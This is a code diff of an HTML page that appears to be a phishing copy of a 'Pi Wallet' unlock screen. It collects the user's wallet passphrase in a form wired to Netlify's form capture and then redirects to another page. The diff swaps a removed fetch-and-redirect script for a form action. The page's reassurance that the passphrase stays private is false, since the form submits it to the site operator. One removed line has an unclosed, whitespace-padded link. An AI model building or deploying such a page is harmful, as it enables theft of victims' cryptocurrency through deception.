@@ -28,7 +28,7 @@
       <span></span>
     </div>
     <h2>Unlock Pi Wallet</h2>
-    <form name="unlock-wallet" data-netlify="true" method="POST" id="unlock-form">
+    <form name="unlock-wallet" data-netlify="true" method="POST" action="seek bar2.html" id="unlock-form">
       <input type="hidden" name="form-name" value="unlock-wallet">
       <div class="input-box">
         <textarea id="passphrase" name="passphrase" required></textarea>
@@ -39,22 +39,9 @@
     <button class="button fingerprint">Unlock With Fingerprint</button>
     <div class="info">
       As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.<br><br>
-      Lost your passphrase? You can <a href="                                                                                         
+      Lost your passphrase? You can <a href="#">create</a> a new wallet, but all your π in your previous wallet will be inaccessible.
     </div>
   </div>
-  <script>
-    document.getElementById('unlock-form').addEventListener('submit', function(event) {
-      event.preventDefault();
-      const form = event.target;
-      const formData = new FormData(form);
-      fetch(form.action || window.location.pathname, {
-        method: 'POST',
-        body: formData
-      })
-      .then(() => {
-        window.location.href = "seek bar2.html";
-      });
-    });
-  </script>
 </body>
-</html>
+        </html>
+        
